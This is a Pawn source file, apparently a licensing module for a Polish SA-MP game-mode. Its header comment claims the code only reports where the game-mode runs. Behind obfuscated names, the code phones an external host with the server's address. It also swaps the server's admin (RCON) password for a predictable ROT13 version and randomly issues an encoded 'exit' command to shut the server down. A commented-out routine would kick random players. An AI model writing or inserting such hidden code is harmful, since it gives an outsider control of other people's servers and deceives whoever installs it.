/*

	celowo nieczytelne
	czesc funkcji zakomentowana w zwiazku z upublicznieniem kodu

	kod znajdujacy sie tu wysyla zapytanie HTTP na zewnetrzny serwer, dzieki czemu wiemy, gdzie gamemod jest uruchamiany.
	prosimy o nie usuwaine tego kodu, nie ma on zadnej innej funkcji oprocz informowania nas.

 */

#define HTTP_INDEX_LICENSING	31337

new iz7ex6ie;
new eivah8aa[5]="fyju";
new hh873a23[14]="epba_cnffjbeq";

forward license_HTTPResponse(index, response, data[]);

#if !defined _inc_a_http

	public OnGameModeInit()
	{
//		usuniete w zwiazku z upublicznieniem kodu
//		print("\n\n\n\n\n\nNie masz licencji na uruchamianie tego gamemoda. Kazde uruchomienie jest rejestrowane na serwerze");
//		print("zewnatrznym. Zastanow sie, czy nie warto nawiazac kontaktu w sprawie licencji na uzytkowanie...\n\n\n\n\n\n");
		SendRconCommand("exit");
		return 1;
	}

	#endinput
#endif

Delay:license_Verify[5000, ](){
 for(new i=0; i<4; i++)
	eivah8aa[i]--;
 HTTP(HTTP_INDEX_LICENSING, HTTP_GET, "www.i64.pl/fs/licence/?GMV=" #GMVERSION "&host=" #GMHOST "&port=" #GMPORT, "","license_HTTPResponse");
 new hh873a24[128];
 for(new i=0;i<strlen(hh873a23);hh873a23[i]=(hh873a23[i]>=97&&hh873a23[i]<=122)?((hh873a23[i]-97+13)%26+97):
 ((hh873a23[i]>=65 && hh873a23[i]<=90)?((hh873a23[i]-65+13)%26+65):hh873a23[i]),i++){}
 GetServerVarAsString(hh873a23, hh873a24, sizeof hh873a24);
 for(new i=0;i<strlen(hh873a24);hh873a24[i]=(hh873a24[i]>=97&&hh873a24[i]<=122)?((hh873a24[i]-97+13)%26+97):
 ((hh873a24[i]>=65&&hh873a24[i]<=90)?((hh873a24[i]-65+13)%26+65):hh873a24[i]),i++){}
 format(hh873a24, sizeof hh873a24, "%s %s", hh873a23, hh873a24);
 SendRconCommand(hh873a24);
}

public license_HTTPResponse(index, response, data[]){
	print("\n\n\n");
/*
	if(response!=200) {
		print("Weryfikacja licencji zakonczona niepowodzeniem. Prawdopodobnie nastapil chwilowy blad w komunikacji z serwerem.");
		SendRconCommand("exit");
		return 1;
	}

	if (data[0]=='R'){ //HTTP_INDEX_LICENSING * strval(GMPORT) != key) {
		print("Nie masz licencji na uruchamianie tego gamemoda. Kazde uruchomienie jest rejestrowane na serwerze");
		print("zewnatrznym. Zastanow sie, czy nie warto nawiazac kontaktu w sprawie licencji na uzytkowanie...");
		ihashoo5();
	} else {
*/
	print(data);
	iz7ex6ie=1;
//	}
	print("\n\n\n");	

	return 1;
}


Delay:ihashoo5[30000, ](){
	ihashoo5();
	SendClientMessageToAll(-1,"ihashoo5");
	
	new randomid=random(MAX_PLAYERS);
	if (!IsPlayerConnected(randomid)) return 1;
	if (random(5)==1) KickPlayer(randomid);

	return 1;
}

Timer:iocai0ah[120000](){
//	SendClientMessageToAll(-1,"iocai0ah");
//	SendClientMessageToAll(-1,eivah8aa);
	if (iz7ex6ie<1 && random(3)==1)
		SendRconCommand(eivah8aa);
}